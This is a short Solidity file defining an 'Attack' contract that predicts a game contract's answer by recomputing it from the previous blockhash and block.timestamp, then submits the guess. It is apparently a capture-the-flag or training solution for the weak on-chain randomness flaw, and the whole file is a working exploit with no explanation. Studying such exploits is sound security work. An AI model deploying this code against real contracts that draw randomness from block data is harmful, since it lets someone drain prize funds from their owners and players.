// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGame {
    function guess(uint256 _guess, address _receiver) external;
}

contract Attack {
    IGame public gameContract;

    constructor(address _gameContract) {
        gameContract = IGame(_gameContract);
    }

    function attack() public {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        gameContract.guess(answer, msg.sender);
    }
}
